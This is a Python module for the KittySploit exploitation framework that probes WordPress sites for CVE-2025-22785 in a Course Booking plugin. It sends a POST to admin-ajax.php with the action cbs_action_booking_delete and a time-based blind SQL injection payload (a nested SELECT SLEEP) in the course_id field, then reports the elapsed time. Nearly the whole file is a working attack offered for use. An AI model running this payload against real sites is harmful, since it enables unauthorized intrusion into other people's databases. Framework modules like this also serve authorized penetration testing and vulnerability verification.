#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Course Booking System CVE-2025-22785 — booking delete SQLi probe."""

import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "Course Booking CVE-2025-22785 SQLi probe",
        "description": "admin-ajax cbs_action_booking_delete with SLEEP in course_id.",
        "author": ["KittySploit Team"],
        "cve": ["CVE-2025-22785"],
        "tags": ["wordpress", "sqli", "auxiliary", "cve-2025-22785"],
    }

    path = OptString("/", "WordPress base path", required=False)
    sleep_seconds = OptInteger(8, "Sleep seconds", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        s = int(self.sleep_seconds or 8)
        data = f"action=cbs_action_booking_delete&booking_id=1&course_id=1 AND (SELECT 1 FROM (SELECT(SLEEP({s})))x)"
        start = time.monotonic()
        self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            data=data,
            timeout=s + 20,
        )
        print_status(f"Elapsed {time.monotonic() - start:.2f}s")
        return True
